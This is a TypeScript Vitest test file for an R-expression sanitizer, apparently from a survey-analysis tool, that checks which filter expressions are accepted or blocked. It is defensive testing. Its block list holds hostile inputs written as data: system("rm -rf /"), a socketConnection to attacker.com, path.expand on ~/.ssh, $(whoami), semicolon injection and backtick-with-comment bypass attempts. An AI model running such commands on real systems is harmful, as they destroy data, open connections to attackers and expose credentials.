import { describe, it, expect } from 'vitest';
import { sanitizeRExpression } from '../sanitizeRExpression';

describe('sanitizeRExpression', () => {
  describe('valid expressions', () => {
    const validExpressions = [
      'Q3 == 1',
      'x %in% c(1, 2, 3)',
      'age >= 18 & age <= 65',
      'gender != 2',
      '!is.na(Q5)',
      '"Yes" == label',
      '(A + B) / 2',
      'x > 0 | y < 10',
      "Q1 == 'test'",
      'score * 100',
      'x ^ 2',
      'Q3 %in% c(1,2,3) & Q4 == 1',
      '!is.na(`Q5`)',
      '!is.na(`A3ar1c1`) | !is.na(`A3ar1c2`)',
      '`S10_RECODE` %in% c(1, 2)',
    ];

    for (const expr of validExpressions) {
      it(`accepts: ${expr}`, () => {
        const result = sanitizeRExpression(expr);
        expect(result.safe).toBe(true);
        expect(result.error).toBeUndefined();
      });
    }
  });

  describe('empty/whitespace', () => {
    it('rejects empty string', () => {
      const result = sanitizeRExpression('');
      expect(result.safe).toBe(false);
      expect(result.error).toContain('empty');
    });

    it('rejects whitespace-only', () => {
      const result = sanitizeRExpression('   ');
      expect(result.safe).toBe(false);
      expect(result.error).toContain('empty');
    });
  });

  describe('dangerous functions', () => {
    const dangerous = [
      { expr: 'system("rm -rf /")', func: 'system' },
      { expr: 'eval(parse(text="x"))', func: 'eval' },
      { expr: 'source("malicious.R")', func: 'source' },
      { expr: 'library(evil)', func: 'library' },
      { expr: 'file.remove("data.sav")', func: 'file.remove' },
      { expr: 'quit()', func: 'quit' },
      { expr: 'do.call(system, "cmd")', func: 'do.call' },
      { expr: 'require(evil)', func: 'require' },
      { expr: 'unlink("file")', func: 'unlink' },
      { expr: 'socketConnection("attacker.com", 1234)', func: 'socketConnection' },
      { expr: 'rawConnection()', func: 'rawConnection' },
      { expr: 'textConnection("text")', func: 'textConnection' },
      { expr: 'Sys.getpid()', func: 'Sys.getpid' },
      { expr: 'Sys.info()', func: 'Sys.info' },
      { expr: 'R.Version()', func: 'R.Version' },
      { expr: 'normalizePath("~")', func: 'normalizePath' },
      { expr: 'path.expand("~/.ssh")', func: 'path.expand' },
      { expr: '.Internal("cmd")', func: '.Internal' },
      { expr: '.Primitive("system")', func: '.Primitive' },
    ];

    for (const { expr, func } of dangerous) {
      it(`blocks ${func}()`, () => {
        const result = sanitizeRExpression(expr);
        expect(result.safe).toBe(false);
        expect(result.error).toContain('disallowed R function');
        expect(result.error).toContain(func);
      });
    }
  });

  it('catches dangerous functions with extra whitespace', () => {
    const result = sanitizeRExpression('system  (  "cmd"  )');
    expect(result.safe).toBe(false);
    expect(result.error).toContain('system');
  });

  it('catches dangerous functions case-insensitively', () => {
    const result1 = sanitizeRExpression('SYSTEM("cmd")');
    expect(result1.safe).toBe(false);

    const result2 = sanitizeRExpression('System("cmd")');
    expect(result2.safe).toBe(false);
  });

  describe('backtick injection', () => {
    it('catches backtick-quoted function call', () => {
      const result = sanitizeRExpression('`system`("cmd")');
      expect(result.safe).toBe(false);
      expect(result.error).toContain('backtick');
    });

    it('catches eval via backticks', () => {
      const result = sanitizeRExpression('`eval`()');
      expect(result.safe).toBe(false);
      expect(result.error).toContain('backtick');
    });

    it('catches backtick call with block comment bypass', () => {
      const result = sanitizeRExpression('`system`/* comment */("cmd")');
      expect(result.safe).toBe(false);
    });

    it('catches backtick call with multi-line comment bypass', () => {
      const result = sanitizeRExpression('`eval`/*\n*/("parse")');
      expect(result.safe).toBe(false);
    });
  });

  describe('shell metacharacters', () => {
    it('catches $(whoami)', () => {
      const result = sanitizeRExpression('$(whoami)');
      expect(result.safe).toBe(false);
      expect(result.error).toContain('shell metacharacters');
    });

    it('catches semicolon injection', () => {
      const result = sanitizeRExpression('Q1 == 1; rm');
      expect(result.safe).toBe(false);
      expect(result.error).toContain('shell metacharacters');
    });
  });

  describe('disallowed characters', () => {
    it('catches @ character', () => {
      const result = sanitizeRExpression('user@domain');
      expect(result.safe).toBe(false);
      expect(result.error).toContain("'@'");
    });

    it('strips # line comments (comment content is removed before validation)', () => {
      // After comment stripping, "Q1 # comment" → "Q1 " which is safe
      const result = sanitizeRExpression('Q1 # comment');
      expect(result.safe).toBe(true);
    });

    it('catches { character', () => {
      const result = sanitizeRExpression('if (TRUE) { x }');
      expect(result.safe).toBe(false);
      expect(result.error).toContain("'{'");
    });

    it('catches } character', () => {
      const result = sanitizeRExpression('function() }');
      expect(result.safe).toBe(false);
      expect(result.error).toContain("'}'");
    });
  });

  describe('allowed special characters', () => {
    const allowed = [
      { expr: 'x + y - z', desc: 'arithmetic operators' },
      { expr: 'x * y / z', desc: 'multiply/divide' },
      { expr: 'x ^ 2', desc: 'power' },
      { expr: '~formula', desc: 'tilde' },
      { expr: 'Q1[1]', desc: 'brackets' },
      { expr: 'x < y', desc: 'less than' },
      { expr: 'x > y', desc: 'greater than' },
      { expr: 'x >= y', desc: 'greater equal' },
      { expr: 'x <= y', desc: 'less equal' },
      { expr: 'x == y', desc: 'equality' },
      { expr: 'x != y', desc: 'not equal' },
      { expr: 'x & y', desc: 'and' },
      { expr: 'x | y', desc: 'or' },
      { expr: 'x %in% c(1,2)', desc: 'pipe-in operator' },
      { expr: '`Q1` == 1', desc: 'backticked identifier' },
    ];

    for (const { expr, desc } of allowed) {
      it(`allows ${desc}: ${expr}`, () => {
        const result = sanitizeRExpression(expr);
        expect(result.safe).toBe(true);
      });
    }
  });

  describe('backticks', () => {
    it('allows backticked identifiers that are not function calls', () => {
      const result = sanitizeRExpression('!is.na(`A3ar1c1`) | (`S10_RECODE` == 1)');
      expect(result.safe).toBe(true);
    });

    it('still blocks backticked function call syntax', () => {
      const result = sanitizeRExpression('`mean`(x)');
      expect(result.safe).toBe(false);
      expect(result.error).toContain('backtick');
    });
  });
});
